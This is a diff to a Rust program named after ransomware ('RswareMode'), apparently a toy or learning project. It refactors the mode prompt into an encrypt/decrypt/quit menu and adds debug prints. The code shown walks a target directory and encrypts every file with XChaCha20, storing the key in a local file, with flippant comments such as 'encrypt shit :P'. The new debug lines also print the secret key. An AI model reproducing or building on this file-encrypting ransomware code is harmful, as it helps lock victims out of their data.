@@ -20,39 +20,56 @@ fn main() -> IDFC<()> {
 	fs::File::create(&keyfile_loc)?;
 	let canonical_keyfile_path = keyfile_loc.canonicalize()?;
 
+	println!("E___ = encrypt, D___ = decrypt, any else = quit");
 	let mode_choice: String = read!();
-	let encrypting = mode_choice.starts_with(|v: char|
-		v.to_lowercase().to_string() == "y"
-	);
-	
+	let mode_choice_firstchar = mode_choice.chars().nth(0).unwrap().to_lowercase().to_string();
+	let mode = match mode_choice_firstchar.as_str() {
+		"e"	=> RswareMode::Encrypt,
+		"d"	=> RswareMode::Decrypt,
+		_	=> RswareMode::Quit,
+	};
+
+	if matches!(mode, RswareMode::Quit) {
+		// quit early, don't waste time making a WalkDir
+		return Ok(())
+	};
+
 	let entries = WalkDir::new(target_dir);
 
-	if encrypting {
-		let key = SecretKey::default();
-		fs::write(keyfile_loc, key.unprotected_as_bytes())?;
+	match mode {
+		RswareMode::Encrypt	=> {
+			let key = SecretKey::default();
+			fs::write(keyfile_loc, key.unprotected_as_bytes())?;
 
-		// encrypt shit :P
-		for entry in entries {
-			let entry = entry?;
-			let path = entry.path();
-	
-			if	path.is_file() &&
-				path.canonicalize()? != canonical_keyfile_path {
-					
-				encrypt_file(path, &key)?;
+			// encrypt shit :P
+			for entry in entries {
+				let entry = entry?;
+				let path = entry.path();
+		
+				if	path.is_file() &&
+					path.canonicalize()? != canonical_keyfile_path {
+						
+					encrypt_file(path, &key)?;
+				}
 			}
-		}
-	} else {
-		let key = read_keyfile(&keyfile_loc)?;
+		},
+		
+		RswareMode::Decrypt	=> {
+			let key = read_keyfile(&keyfile_loc)?;
 
-		// decrypt shit uwu
-		for entry in entries {
-			let entry = entry?;
-			let path = entry.path();
-	
-			if path.is_file() {
-				decrypt_file(path, &key)?;
+			// decrypt shit uwu
+			for entry in entries {
+				let entry = entry?;
+				let path = entry.path();
+		
+				if path.is_file() {
+					decrypt_file(path, &key)?;
+				}
 			}
+		},
+
+		RswareMode::Quit	=> {
+			unreachable!()
 		}
 	};
 
@@ -97,6 +114,8 @@ fn decrypt_file(path: &Path, key: &SecretKey) -> IDFC<()> {
 	decrypted_path.truncate(decrypted_path.len() - ENCRYPTED_EXTENSION.len());
 	let decrypted_path = decrypted_path;
 
+	dbg!(&file_name, &decrypted_path);
+
 	// Prepare new file data
 	let content = fs::read(&path)?;
 	let plaintext = decrypt_xchacha20(&content[..], &key)?;
@@ -117,10 +136,14 @@ fn encrypt_xchacha20(src: &[u8], key: &SecretKey) -> IDFC<Vec<u8>> {
 }
 
 fn decrypt_xchacha20(src: &[u8], key: &SecretKey) -> IDFC<Vec<u8>> {
+	dbg!(&src, &key);
+
 	let decrypted = aead::open(
 		&key,
 		src
 	)?;
+
+	dbg!(&decrypted);
 
 	Ok(decrypted)
 }
@@ -128,4 +151,10 @@ fn decrypt_xchacha20(src: &[u8], key: &SecretKey) -> IDFC<Vec<u8>> {
 fn read_keyfile(keyfile: &Path) -> IDFC<SecretKey> {
 	let keyfile_data = fs::read(&keyfile)?;
 	Ok(SecretKey::from_slice(&keyfile_data[..])?)
+}
+
+enum RswareMode {
+	Encrypt,
+	Decrypt,
+	Quit,
 }
